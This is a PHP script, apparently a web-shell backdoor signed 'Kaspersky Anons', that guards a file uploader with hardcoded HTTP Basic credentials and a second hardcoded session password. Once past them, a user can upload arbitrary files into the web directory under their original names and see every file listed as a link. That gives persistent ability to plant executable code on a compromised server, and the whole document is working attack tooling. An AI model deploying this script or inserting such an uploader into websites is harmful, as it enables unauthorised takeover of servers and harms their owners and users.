<?php
//Khai bao dang nhap
$config['kaspersky_dnp'] = '!@!@!kasperskyanons!@!@!';
$config['anons_dnp'] = '3124598472';

if ($_SERVER['PHP_AUTH_USER'] != $config['kaspersky_dnp'] || $_SERVER['PHP_AUTH_PW'] != $config['anons_dnp']){
header('WWW-Authenticate: Basic realm="Xin vui long khai bao thong tin yeu cau truoc khi duoc chuyen den bang dang nhap"');
header('HTTP/1.0 401 Unauthorized');


//
echo '<center>Fuck You Attacker !!! . I am Kaspersky Anons !!!</center>';
exit;
}
?>
<?php
$pass = "22031998";
session_start();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256" /></head><body>
<?php
if (!empty($_GET['action']) &&  $_GET['action'] == "logout") {session_destroy();unset ($_SESSION['pass']);}

$path_name = pathinfo($_SERVER['PHP_SELF']);
$this_script = $path_name['basename'];
if (empty($_SESSION['pass'])) {$_SESSION['pass']='';}
if (empty($_POST['pass'])) {$_POST['pass']='';}
if ( $_SESSION['pass']!== $pass) 
{
    if ($_POST['pass'] == $pass) {$_SESSION['pass'] = $pass; }
    else 
    {
        echo '<form action="'.$_SERVER['PHP_SELF'].'" method="post"><input name="pass" type="password"><input type="submit"></form>';
        exit;
    }
}
?>


<form enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
Please choose a file: <input name="file" type="file" /><br />
<input type="submit" value="Upload" /></form>


<?php 

if (!empty($_FILES["file"]))
{
    if ($_FILES["file"]["error"] > 0)
       {echo "Error: " . $_FILES["file"]["error"] . "<br>";}
    else
       {echo "Stored file:".$_FILES["file"]["name"]."<br/>Size:".($_FILES["file"]["size"]/5000)." kB<br/>";
       move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);
       }
}

    // open this directory 
    $myDirectory = opendir(".");
    // get each entry
    while($entryName = readdir($myDirectory)) {$dirArray[] = $entryName;} closedir($myDirectory);
    $indexCount = count($dirArray);
        echo "$indexCount files<br/>";
    sort($dirArray);

    echo "<TABLE border=1 cellpadding=5 cellspacing=0 class=whitelinks><TR><TH>Filename</TH><th>Filetype</th><th>Filesize</th></TR>\n";

        for($index=0; $index < $indexCount; $index++) 
        {
            if (substr("$dirArray[$index]", 0, 1) != ".")
            {
            echo "<TR>
            <td><a href=\"$dirArray[$index]\">$dirArray[$index]</a></td>
            <td>".filetype($dirArray[$index])."</td>
            <td>".filesize($dirArray[$index])."</td>
                </TR>";
            }
        }
    echo "</TABLE>";
    ?>